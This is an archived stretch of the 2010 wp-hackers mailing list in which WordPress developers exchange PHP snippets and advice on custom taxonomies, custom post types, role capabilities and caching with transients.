>>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com
>> |
>>>>> Twitter : http://twitter.com/ashfame
>>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> 
>>> 
>>> ------------------------------
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>>> 
>>> End of wp-hackers Digest, Vol 66, Issue 101
>>> *******************************************
>>> 
>> 
>> 
>> 
>> -- 
>> Thank you,
>> 
>> Jared Williams
>> Web/Graphic Designer
>> Tweeaks.com  |  New2WP.com
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From KrisY at tbs.uk.com  Wed Jul 28 08:43:26 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Wed, 28 Jul 2010 09:43:26 +0100
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
In-Reply-To: <43A82B40-1B28-4787-B2A6-79C090FF3264@newclarity.net>
References: <mailman.11.1280145602.13432.wp-hackers@lists.automattic.com><AANLkTinuEOPfaH+Rn4TQs4id7GehgrJA0t4OPgvWfae2@mail.gmail.com><CD47955B7E065D48AB5CF226C2ED75C02E31A7@tbs-sbs01.TBS.local><C4C7D49E-330F-4985-8A56-18758CA63670@newclarity.net>
	<43A82B40-1B28-4787-B2A6-79C090FF3264@newclarity.net>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E31BF@tbs-sbs01.TBS.local>

Mike, I don't know if I've told you this, but I love you.

This has saved me a LOT of trouble. Greatly appreciated.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mike
Schinkel
Sent: 26 July 2010 22:26
To: wp-hackers
Subject: Re: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101

Oops, I meant to include this link to a standalone file that you can
download to your website root to demonstrate this with your own
post_type and taxonomy:

http://gist.github.com/491202

-Mike

On Jul 26, 2010, at 4:56 PM, Mike Schinkel wrote:

> Hi Kris:
> 
> I was intrigued to find a solution for "taxonomy=clients" and
"term=any" where "any" is a wildcard (WP_Query() supports "any" as a
wildcard for post_types but not for terms of a taxonomy.)
> 
> Here's a hook that adds an "any" wildcard for terms for a taxonomy
assuming some other plugin didn't muck with the " AND 0 " inserted into
the WHERE clause when a taxonomy term doesn't match:
> 
> add_action('posts_where','my_posts_where',10,2);
> 
> function my_posts_where($where,$query) {
> 	if (isset($query->query_vars['taxonomy']) &&
$query->query_vars['term']=='any') {
> 		global $wpdb;
> 		$tt = $wpdb->term_taxonomy;
> 		$tr = $wpdb->term_relationships;
> 		$where .= $wpdb->prepare(" AND {$wpdb->posts}.ID IN (
> 						SELECT object_id FROM
$tr
> 						INNER JOIN $tt ON
$tt.term_taxonomy_id = $tr.term_taxonomy_id
> 						WHERE $tt.taxonomy=%s)
",$query->query_vars['taxonomy']);
> 		$where = str_replace(' AND 0 ','',$where);
> 	}
> 	return $where;
> }
> 
> Your query for this would look like this:
> 
> $posts = new
WP_Query("post_type=portfolio_item&taxonomy=clients&term=any&posts_per_p
age=-1");
> 
> Or like this:
> 
> $posts = new WP_Query(array(
> 	'post_type' => 'portfolio_item',
> 	'taxonomy' => 'clients',
> 	'term' => 'any',
> 	'posts_per_page' => -1,
> ));
> 
> It works but unfortunately it's not very robust because of the need to
remove the " AND 0 " from the WHERE clause because there are other
reasons get_posts() adds " AND 0 ".  If query natively supported
"term=any" or at least if there was a hook in /wp-includes/query.php
(lines 2049 and 2068) that allowed us to target this specifically it
might be better; if any of the core team agree I'll add a ticket to
trac.
> 
> Alternate, maybe someone else knows a better way I didn't discover?
> 
> -Mike
> 
> 
> On Jul 26, 2010, at 10:53 AM, Kris Young wrote:
> 
>> I was as nice as I could be in my original mail without getting
>> frustrated - it really helps though that someone else is having the
same
>> problem though. I honestly think this whole process was a lot more
>> complicated than it should have been.
>> 
>> Thanks for your solution - I will do my best to take a look at it
today,
>> and will let you know when I make some progress. Thanks again, and
also
>> to Mike Schinkel for the same.
>> 
>> Kris
>> 
>> -----Original Message-----
>> From: wp-hackers-bounces at lists.automattic.com
>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jared
>> Williams
>> Sent: 26 July 2010 14:23
>> To: wp-hackers at lists.automattic.com
>> Subject: Re: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
>> 
>> I have a wp_nav_menu, and it has two top level pages that have a
bunch
>> of
>> terms I've created for two custom taxonomies, which are for the two
top
>> level pages. I'm trying to figure out how I can hide the terms from
the
>> drop
>> down menu I made that shows the terms, if there are no posts assigned
to
>> a
>> term of the taxonomies. Is this possible? It doesn't seem like it is.
>> 
>> 
>> As for Kris Young's question about showing all posts of a taxonomy,
this
>> is
>> a problem I ran into as well, and searched for a long time and found
it
>> very
>> hard to figure out.
>> 
>> What I managed to do is list all terms for a taxonomy, and all the
posts
>> for
>> each term individually. You may be able to hack this to do what
you're
>> trying to do since it is the same as what I needed to do I just
didn't
>> have
>> time to make it list only the posts for the taxonomy.
>> 
>> 
>> <?php
>> // Create list of taxonomy terms and list the posts under each term
>> $post_type = 'post';
>> $tax = 'your_custom_taxonomy';
>> $tax_terms = get_terms( $tax );
>> if ($tax_terms) {
>>   foreach ($tax_terms  as $tax_term) {
>>   $args = array(
>>       'post_type' => $post_type,
>>       "tax" => $tax_term->slug,
>>       'post_status' => 'publish',
>>       'posts_per_page' => -1,
>>       'caller_get_posts'=> 1
>>   );
>> 
>>       $my_query = null;
>>       $my_query = new WP_Query($args);
>> 
>>       if( $my_query->have_posts() ) : ?>
>> 
>>           <h2 class="breadcrumb">All <?php echo $tax; ?> Posts For
>> <?php
>> echo $tax_term->name; ?></h2>
>>           <ul class="taxlist">
>>           <?php while ( $my_query->have_posts() ) :
>> $my_query->the_post();
>> ?>
>> 
>>               <li id="post-<?php the_ID(); ?>">
>>                   <a href="<?php the_permalink(); ?>" rel="bookmark"
>> title="Permanent Link to <?php the_title_attribute(); ?>"><?php
>> the_title();
>> ?></a>
>>               </li>
>> 
>> 
>>           <?php endwhile; // end of loop ?>
>>           </ul>
>> 
>>           <?php if( function_exists('wp_pagenavi')) { wp_pagenavi();
}
>> else { ?>
>>               <div class="navigation clearfix">
>>                   <div class="alignleft"><?php
>> next_posts_link('&laquo;
>> Previous Entries') ?></div>
>>                   <div class="alignright"><?php
>> previous_posts_link('Next
>> Entries &raquo;') ?></div>
>>               </div>
>>           <?php } ?>
>> 
>>       <?php else : ?>
>> 
>>           <h2 class="title">Oops</h2>
>>           <p>Looks like something is missing...</p>
>> 
>>       <?php endif; // if have_posts()
>>       wp_reset_query();
>> 
>>   } // end foreach #tax_terms
>> }
>> ?>
>> 
>> Hope this helps.
>> 
>> Jared Williams
>> 
>> 
>> On Mon, Jul 26, 2010 at 8:00 AM,
>> <wp-hackers-request at lists.automattic.com>wrote:
>> 
>>> Send wp-hackers mailing list submissions to
>>>      wp-hackers at lists.automattic.com
>>> 
>>> To subscribe or unsubscribe via the World Wide Web, visit
>>>      http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> or, via email, send a message with subject or body 'help' to
>>>      wp-hackers-request at lists.automattic.com
>>> 
>>> You can reach the person managing the list at
>>>      wp-hackers-owner at lists.automattic.com
>>> 
>>> When replying, please edit your Subject line so it is more specific
>>> than "Re: Contents of wp-hackers digest..."
>>> 
>>> 
>>> Today's Topics:
>>> 
>>> 1. Re: Custom post types - a multitude of problems (Mike Schinkel)
>>> 2. Querying posts of another WordPress install (Ashish Saini)
>>> 3. Re: Querying posts of another WordPress install (Ashish Saini)
>>> 4. Re: Querying posts of another WordPress install (Aaron Jorbin)
>>> 
>>> 
>>>
----------------------------------------------------------------------
>>> 
>>> Message: 1
>>> Date: Mon, 26 Jul 2010 06:06:14 -0400
>>> From: Mike Schinkel <mikeschinkel at newclarity.net>
>>> Subject: Re: [wp-hackers] Custom post types - a multitude of
problems
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID: <F70451A1-2EFF-4911-BD5C-ACC86CF452E7 at newclarity.net>
>>> Content-Type: text/plain;       charset=us-ascii
>>> 
>>> On Jul 26, 2010, at 5:20 AM, Kris Young wrote:
>>>> I need to output the contents (all posts, all content of those
>> posts) of
>>>> a specific custom category (taxonomy) and I have no idea how to get
>> it
>>>> done. All I want is a page that outputs all the posts for a certain
>>>> category (and that category only) that I created using this code:
>>>> 
>>>> register_taxonomy("clients", array("portfolio_item"),
>>>> array("hierarchical" => true, "label" => "Clients",
"singular_label"
>> =>
>>>> "Client", "rewrite" => array('slug'=>'portfolio_item')));
>>>> 
>>>> Yes, that part was simple, but for some reason my custom taxonomy
is
>>>> completely separate from the rest of the site and irretrievable.
>> Can't
>>>> figure out for the life of me how to do this.
>>> 
>>> To start, I think you have your taxonomy registration wrong. (FWIW
my
>>> preference would be to go with a singular for the taxonomy name,
e.g.
>>> "client" but I'll leave yours as is):
>>> 
>>> $labels = array(
>>>  'name' => _x( 'Clients', 'taxonomy general name' ),
>>>  'singular_name' => _x( 'Client', 'taxonomy singular name' ),
>>>  'search_items' =>  __( 'Search Clients' ),
>>>  'all_items' => __( 'All Clients' ),
>>>  'parent_item' => __( 'Parent Client' ),
>>>  'parent_item_colon' => __( 'Parent Client:' ),
>>>  'edit_item' => __( 'Edit Client' ),
>>>  'update_item' => __( 'Update Client' ),
>>>  'add_new_item' => __( 'Add New Client' ),
>>>  'new_item_name' => __( 'New Client Name' ),
>>> );
>>> 
>>> register_taxonomy("clients", array("portfolio_item"),array(
>>>      "hierarchical" => true,
>>>      "labels" => $labels,
>>>      "public" => true,
>>>      "show_ui" => true,
>>>      "query_var" => "clients",
>>>      "rewrite" => array('slug'=>'client'),
>>> ));
>>> 
>>> Many of these options will default but I went ahead and listed them
>> all.
>>> Read more here:
>>> 
>>> http://codex.wordpress.org/Function_Reference/register_taxonomy
>>> 
>>> As for the rest of your question, I'm unclear.  Do you want all
>> Portfolio
>>> Items that have *any* clients, or a specific client?  For a specific
>> client
>>> i.e. "john-smith" I think this would be what you need (though I
>> haven't run
>>> the code so it may have typos):
>>> 
>>> <?php
>>> $portfolio_items = new
>>> 
>>
WP_Query('post_type=portfolio_item&taxonomy=clients&term=john-smith&post
>> s_per_page=-1');
>>> if ( $portfolio_items->have_posts() ):
>>>      while ( $portfolio_items->have_posts() ) :
>>> $portfolio_items->the_post(); ?>
>>>              <h2 id="post-<?php the_ID(); ?>" <?php post_class();
>>> ?>><?php the_title(); ?></h2>
>>>              <?php the_content();
>>>      endwhile;
>>> endif;
>>> 
>>> If you want to get all portfolio items that have *any* clients I've
>>> actually not done that before so I'll have to let someone else
answer.
>>> 
>>> HTH.
>>> 
>>> -Mike
>>> 
>>> ------------------------------
>>> 
>>> Message: 2
>>> Date: Mon, 26 Jul 2010 17:08:30 +0530
>>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>>> Subject: [wp-hackers] Querying posts of another WordPress install
>>> To: wp-hackers <wp-hackers at lists.automattic.com>
>>> Message-ID:
>>>      <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> Hi,
>>> 
>>> Is there any way that I can query posts from another WordPress
install
>>> residing in the same database? I know it can be done via SQL queries
>> but is
>>> there any workaround hacking my way along with API?
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>> 
>>> 
>>> ------------------------------
>>> 
>>> Message: 3
>>> Date: Mon, 26 Jul 2010 17:12:22 +0530
>>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>>> Subject: Re: [wp-hackers] Querying posts of another WordPress
install
>>> To: wp-hackers <wp-hackers at lists.automattic.com>
>>> Message-ID:
>>>      <AANLkTimmte-eFUkmk2w3KsaZpWkHCKtD=pxU4OnPj0XA at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> I think this can be done with the help of setup_postdata() by
>> populating
>>> the
>>> fields as explained here -
>>> 
>>
http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>>> 
>>> Right? And is this the best approach?
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>> 
>>> 
>>> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> Hi,
>>>> 
>>>> Is there any way that I can query posts from another WordPress
>> install
>>>> residing in the same database? I know it can be done via SQL
queries
>> but
>>> is
>>>> there any workaround hacking my way along with API?
>>>> 
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com
|
>>>> Twitter : http://twitter.com/ashfame
>>>> 
>>> 
>>> 
>>> ------------------------------
>>> 
>>> Message: 4
>>> Date: Mon, 26 Jul 2010 07:56:17 -0400
>>> From: Aaron Jorbin <aaron at jorb.in>
>>> Subject: Re: [wp-hackers] Querying posts of another WordPress
install
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>>      <AANLkTin6x+4NT6E6bxR=1Xq43D6txPhT0et2xnK_45Nt at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> Is this using Multisite?  If so, you can use switch_to_blog -
>>> http://codex.wordpress.org/WPMU_Functions/switch_to_blog and it's
>>> counterpart restore_current_blog -
>>> http://codex.wordpress.org/WPMU_Functions/restore_current_blog to
move
>>> around use the api.
>>> 
>>> 
>>> 
>>> http://aaron.jorb.in
>>> twitter: twitter.com/aaronjorbin
>>> 
>>> 
>>> On Mon, Jul 26, 2010 at 7:42 AM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> I think this can be done with the help of setup_postdata() by
>> populating
>>>> the
>>>> fields as explained here -
>>>> 
>>
http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>>>> 
>>>> Right? And is this the best approach?
>>>> 
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com
|
>>>> Twitter
>>>> : http://twitter.com/ashfame
>>>> 
>>>> 
>>>> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
>>>> <ashishsainiashfame at gmail.com>wrote:
>>>> 
>>>>> Hi,
>>>>> 
>>>>> Is there any way that I can query posts from another WordPress
>> install
>>>>> residing in the same database? I know it can be done via SQL
>> queries
>>> but
>>>> is
>>>>> there any workaround hacking my way along with API?
>>>>> 
>>>>> Thanks & Regards
>>>>> Ashish Saini aka Ashfame
>>>>> (Deserve Before You Desire)
>>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com
>> |
>>>>> Twitter : http://twitter.com/ashfame
>>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> 
>>> 
>>> ------------------------------
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>>> 
>>> End of wp-hackers Digest, Vol 66, Issue 101
>>> *******************************************
>>> 
>> 
>> 
>> 
>> -- 
>> Thank you,
>> 
>> Jared Williams
>> Web/Graphic Designer
>> Tweeaks.com  |  New2WP.com
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From johnbillion+wp at gmail.com  Wed Jul 28 09:50:53 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Wed, 28 Jul 2010 10:50:53 +0100
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
	<AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com>
Message-ID: <AANLkTi=kgJT1gOp6NQQTjWHD4uxFzWBeJNaZRcbCDkHn@mail.gmail.com>

On Wed, Jul 28, 2010 at 8:29 AM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> Thats my Psudo code based on my understanding on how this is going to work.
> So heres my thing, assuming I got that part of it right, how would I start
> off the function, what arguments would it receive and in what order to tell
> me what capability is being tested and what WordPresses reponse was.

The user_has_cap filter isn't an easy one for someone who isn't used
to WordPress, and it's not very well documented as you point out.

Here is a reasonably well commented block of code from a plugin of
mine I wrote for a client. It might help you to start to understand
it. This particular filter has a very specific purpose which is to
allow authors to edit contributors' posts if the post is pending.
http://pastebin.ca/1909968 .

HTH
John

From dan at dansmart.co.uk  Wed Jul 28 10:34:21 2010
From: dan at dansmart.co.uk (Dan Smart)
Date: Wed, 28 Jul 2010 11:34:21 +0100
Subject: [wp-hackers] Best format for regularly updated data
In-Reply-To: <3E70F50F-DCD6-48E7-9C08-7E95812041CF@newclarity.net>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>	<005801cb2e27$a21ea270$e65be750$@co.uk>
	<3E70F50F-DCD6-48E7-9C08-7E95812041CF@newclarity.net>
Message-ID: <007401cb2e40$718928b0$549b7a10$@co.uk>

Ok to do that I'll have to maintain a cross-referenced list of courses to
post ids, and add new courses / delete them where necessary, but that sounds
maintainable.

Why do you specifically recommend Custom Post ids in this situation, rather
than Pages containing course information? Is it because it's easier to just
display courses with their information more appropriately, or another
reason?

Thanks,

Dan

----------------------------------------------------------------------------
---------
Dan Smart - Freelance Web Developer
Web: www.dansmart.co.uk
Follow me at: www.twitter.com/danielsmart


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mike Schinkel
Sent: 28 July 2010 08:47
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Best format for regularly updated data

On Jul 28, 2010, at 3:36 AM, Dan Smart wrote:
> 1) The plugin imports to a db table of its own, and displays the 'pages'
> itself, managing the rewrite rules to display the appropriate content.
> 
> 2) On the import of data, create new Wordpress Pages each time, and track
> and delete the old ones (they will no longer be needed). Are there any
> downsides to this regular turnover of pages?

Why can't you use option #3, update the existing pages?  (actually, you'd
almost certainly want to use custom post types instead of pages.)

-Mike
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From thenbrent at gmail.com  Wed Jul 28 10:53:54 2010
From: thenbrent at gmail.com (Brent Shepherd)
Date: Wed, 28 Jul 2010 20:53:54 +1000
Subject: [wp-hackers] Adding a custom content type that only a
	particular role can create/modify
In-Reply-To: <000001cb2c6a$2da53b70$88efb250$@org>
References: <Acssaisip2aHr5SoS9KdicjbRvunYw==>
	<000001cb2c6a$2da53b70$88efb250$@org>
Message-ID: <AANLkTinPEn4bk2gSC9_zPyfPLNOpDA2eo3h+Q5FQQu6Y@mail.gmail.com>

Raj,

You need to map the wiki_page meta capabilities using the map_meta_cap
filter.

Doesn't help much does it? :)

It's best explained in code. Check out this file:
http://github.com/Prospress/Prospress/blob/master/pp-posts/pp-capabilities.php

There are three functions, each well commented enough for you to learn how
to manage the capabilities for a custom post type.

I've started work on a plugin to allow admins to manage capabilities for all
custom posts types, and to act as a guide to other plugin developers for
mapping meta caps. Once you get your head around it, if you'd like to help
write the plugin, let me know.

Brent




On Mon, Jul 26, 2010 at 12:28 PM, Raj <list at expost.org> wrote:

> Hi all,
>
>
>
> Here's what I need to do in my plugin:
>
>
>
> 1.       Add a Wiki Page Content Type
>
> 2.      Add 'Wiki Editor' Role
>
> 3.      Ensure that the users of Wiki Editor role and only they are able to
> create and edit 'Wiki Page' type.
>
>
>
>
>
> Here's what happens:
>
>
>
> Nothing. When I create a user of type Wiki Editor and then log in and then
> log in as that user, I see no option to create content of any type. When
> the
> user logs in I see just two menu items -  Dashboard and  Profile
>
>
>
> I had initially set the capability_type to 'post'. But that allowed anyone
> with the 'publish_posts' permissions to create Wiki Pages. So I renamed the
> capability_type to 'wiki_page'. Then the Wiki Page content type became
> unavailable for the administrator account. To solve that I added
> wiki_editor
> to the administrator's role after which the Wiki Page was visible to the
> admnistrator's account.
>
>
>
> Here's the full code:
>
>
>
> <?php
>
> /*
>
> Plugin Name: Wiki
>
> Author: Rajasekharan S
>
> Description: This is a plugin to add a Wiki to Wordpress.
>
> */
>
>
>
> function wiki_init()
>
> {
>
>
>
>
>
>  $labels = array(
>
>    'name' => _x('Wiki Pages', 'post type general name'),
>
>    'singular_name' => _x('Wiki Page', 'post type singular name'),
>
>    'add_new' => _x('Add New', 'wikipage'),
>
>    'add_new_item' => __('Add New Wiki Page'),
>
>    'edit_item' => __('Edit Wiki Page'),
>
>    'new_item' => __('New Wiki Page'),
>
>    'view_item' => __('View Wiki Page'),
>
>    'search_items' => __('Search Wiki Pages'),
>
>    'not_found' =>  __('No wikipages found'),
>
>    'not_found_in_trash' => __('No wikipages found in Trash'),
>
>    'parent_item_colon' => ''
>
>  );
>
>
>
>  $args = array(
>
>    'labels' => $labels,
>
>    'public' => true,
>
>    'publicly_queryable' => true,
>
>    'show_ui' => true,
>
>    'query_var' => true,
>
>    'rewrite' => true,
>
>    'capability_type' => 'wiki_page',
>
>    'hierarchical' => false,
>
>    'menu_position' => 5,
>
>    'supports' =>
> array('title','editor','author','thumbnail','excerpt','comments')
>
>  );
>
>  register_post_type('wikipage',$args);
>
>
>
>  $role_capabilities =
>
> array('read'=>1,'edit_wiki_page'=>1,'edit_others_wiki_pages'=>1,'edit_publis
> hed_wiki_pages'=>1,'read'=>1,'publish_wiki_pages'=>1);
>
>
>
>  add_role( 'wikicontributor', 'WikiContibutor', $role_capabilities );
>
>
>
> }
>
>
>
> add_action('init', 'wiki_init');
>
>
>
> Please tell me what I am doing wrong. How do I make this thing work.
>
>
>
> Warm Regards,
>
> Raj Sekharan
>
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jer at simianuprising.com  Wed Jul 28 13:44:01 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 28 Jul 2010 09:44:01 -0400
Subject: [wp-hackers] wp_cache function tutorials?
In-Reply-To: <AANLkTimSbQL7K0q8WLX__pqzJ5Qv3tPcqefOWvBwTNyu@mail.gmail.com>
References: <AANLkTikj9xwBh0T_BDyMuZKZ6_4rDZ7_M+goOHT=fNu1@mail.gmail.com>
	<AANLkTimSbQL7K0q8WLX__pqzJ5Qv3tPcqefOWvBwTNyu@mail.gmail.com>
Message-ID: <AANLkTimZwG7Wc-gvD4jwtU=_6ABAjdNi+dErSEvZ158t@mail.gmail.com>

When you have such a large data set I think you move from worrying about
caching the particular data and into optimizing your database caching as a
whole.

Like Mike I wonder if you wouldn't be better off using the posts/custom
posts system rather than your own table. Doing so would simplify your life
in many ways including the fact that once your content was in post format
you could take advantage of all the build-in caching stuff that wordpress
has there. Obviously you'd also get all the query/db optimization that has
gone into the posts system over the years. Starting from scratch with
queries to your custom table will probably generate more database issues
than anything.

That aside, you should focus on having good general caching of your DB
queries and of your pages. Use something like Supercache to make sure that
the homepage etc. don't hit the DB every time, and something like memcached
to try to avoid hitting the database when possible.

On Mon, Jul 26, 2010 at 5:45 PM, Otto <otto at ottodestruct.com> wrote:

>
>  Transients should not be used for storing data that you retrieved from
> the database, since it stores them in the database by default anyway.
>
>
Otto is right for the most part but IMHO there are scenarios where saving
data 'from the database' in a transient can make sense even though it is
still stored in the database by the transient system. Specifically, there
are times when you pull data from multiple tables using complex/expensive
joins, often followed by heavy PHP processing resulting in a very specific
data set that itself isn't huge but in the end takes a lot of resources to
regenerate. In these cases a transient can save a lot of resources because
they are autoloaded from the options table as part of a single query that
fetches all options. This means that the only extra database strain is the
exact amount of data you saved in the transient. So if your resulting
dataset is humongous (i.e. hundreds of kilobytes) then it might not be
efficient to store them in options, but if its relatively small then there
are huge gains to be had, especially for data that is used on every page in
the same way (like a list of authors who have posted recently, or a list of
recent songs with high popularity).

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From mikeschinkel at newclarity.net  Wed Jul 28 17:00:40 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 28 Jul 2010 12:00:40 -0500 (CDT)
Subject: [wp-hackers] Best format for regularly updated data
In-Reply-To: <007401cb2e40$718928b0$549b7a10$@co.uk>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>	<005801cb2e27$a21ea270$e65be750$@co.uk>
	<3E70F50F-DCD6-48E7-9C08-7E95812041CF@newclarity.net>
	<007401cb2e40$718928b0$549b7a10$@co.uk>
Message-ID: <5739DB03-DF31-436A-821C-7CCEC0F008CE@newclarity.net>

Where do I begin? :-)

With custom post types for Courses over Pages you get ability to:

1. Query for Courses only using WP_Query("post_type=course").
2. Have a Course-specific template in your theme, i.e. single-course.php.
3. Have a Course-specific admin edit page with Course-specific metaboxes.
4. Have Course-specific taxonomy terms that only apply to Courses.
5. Get a Course-specific URLs, i.e. http://example.com/courses/{course-name}/

They are probably more reasons but these are 5 that come to mind (anyone else know of others?) Worthwhile for your use-cases?

-Mike    

On Jul 28, 2010, at 6:34 AM, "Dan Smart" <dan at dansmart.co.uk> wrote:

> Ok to do that I'll have to maintain a cross-referenced list of courses to
> post ids, and add new courses / delete them where necessary, but that sounds
> maintainable.
> 
> Why do you specifically recommend Custom Post ids in this situation, rather
> than Pages containing course information? Is it because it's easier to just
> display courses with their information more appropriately, or another
> reason?
> 
> Thanks,
> 
> Dan
> 
> ----------------------------------------------------------------------------
> ---------
> Dan Smart - Freelance Web Developer
> Web: www.dansmart.co.uk
> Follow me at: www.twitter.com/danielsmart
> 
> 
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mike Schinkel
> Sent: 28 July 2010 08:47
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Best format for regularly updated data
> 
> On Jul 28, 2010, at 3:36 AM, Dan Smart wrote:
>> 1) The plugin imports to a db table of its own, and displays the 'pages'
>> itself, managing the rewrite rules to display the appropriate content.
>> 
>> 2) On the import of data, create new Wordpress Pages each time, and track
>> and delete the old ones (they will no longer be needed). Are there any
>> downsides to this regular turnover of pages?
> 
> Why can't you use option #3, update the existing pages?  (actually, you'd
> almost certainly want to use custom post types instead of pages.)
> 
> -Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From peter.westwood at ftwr.co.uk  Wed Jul 28 17:13:36 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 28 Jul 2010 18:13:36 +0100
Subject: [wp-hackers] Best format for regularly updated data
In-Reply-To: <007401cb2e40$718928b0$549b7a10$@co.uk>
